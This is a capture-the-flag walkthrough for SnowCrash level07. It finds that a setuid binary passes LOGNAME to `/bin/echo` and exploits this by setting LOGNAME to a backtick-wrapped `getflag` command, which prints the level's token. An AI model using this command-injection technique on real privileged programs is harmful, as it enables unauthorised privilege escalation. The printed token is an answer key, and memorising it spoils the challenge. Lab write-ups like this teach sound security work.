# 1st Step  
List the file with `ls -l` will show us :  
```
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
level07@SnowCrash:~$
```    
  
Let's execute it to see what's appening
```
level07@SnowCrash:~$ ./level07
level07
```  
If we look at the executable with `strings`:  
```
level07@SnowCrash:~$ strings level07
[...]
LOGNAME
/bin/echo %s
[...]
level07@SnowCrash:~$
```  
So, we know that the script will run this `/bin/echo %s ` with variable env LOGNAME as %s  
Let's exploit it !  
  
# 2nd Step
We have to change the value of the variable env `LOGNAME` then execute `level07` file  
```
level07@SnowCrash:~$ printenv | grep LOGNAME
LOGNAME=level07
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
level07@SnowCrash:~$ printenv | grep LOGNAME
LOGNAME=`getflag`
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$ su level08
Password:
level08@SnowCrash:~$
```  
level07 passed !
